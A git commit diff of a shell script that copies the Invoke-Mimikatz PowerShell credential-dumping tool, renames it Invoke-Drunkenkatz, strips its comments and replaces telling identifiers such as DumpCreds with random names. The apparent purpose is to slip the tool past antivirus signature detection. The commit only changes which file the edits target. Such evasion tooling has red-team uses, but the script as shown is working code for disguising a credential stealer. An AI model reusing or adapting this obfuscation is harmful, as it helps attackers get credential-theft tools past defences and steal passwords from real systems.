c76aa5479b7cc88af36aa5daea0e1a21201d5ccd
Nate Drier <ndrier@secureworks.com>
2017-02-15 10:25:30 -0500

    changing filename

--- get_drunk.sh
+++ get_drunk.sh
@@ -4,20 +4,20 @@
 #brew-install gnu-sed
 
 #copy a fresh katz
-cp Invoke-Mimikatz.orig.ps1 Invoke-Mimikatz.ps1
+cp Invoke-Mimikatz.orig.ps1 Invoke-Drunkenkatz.ps1
 
-#use gsed to change a bunch of variable names within Invoke-Mimikatz.ps1
+#use gsed to change a bunch of variable names within Invoke-Drunkenkatz.ps1
 
 #main name
-gsed -i -e 's/Invoke-Mimikatz/Invoke-Drunkenkatz/g' Invoke-Mimikatz.ps1
+gsed -i -e 's/Invoke-Mimikatz/Invoke-Drunkenkatz/g' Invoke-Drunkenkatz.ps1
 
 #remove all comments
-gsed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
-gsed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
+gsed -i -e '/<#/,/#>/c\\' Invoke-Drunkenkatz.ps1
+gsed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Drunkenkatz.ps1
 
 #change var names
-gsed -i -e 's/DumpCreds/RandomVar111/g' Invoke-Mimikatz.ps1
-gsed -i -e 's/ArgumentPtr/RandomVar222/g' Invoke-Mimikatz.ps1
-gsed -i -e 's/CallDllMainSC1/RandomVar333/g' Invoke-Mimikatz.ps1
+gsed -i -e 's/DumpCreds/RandomVar111/g' Invoke-Drunkenkatz.ps1
+gsed -i -e 's/ArgumentPtr/RandomVar222/g' Invoke-Drunkenkatz.ps1
+gsed -i -e 's/CallDllMainSC1/RandomVar333/g' Invoke-Drunkenkatz.ps1
 
-gsed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
+gsed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Drunkenkatz.ps1
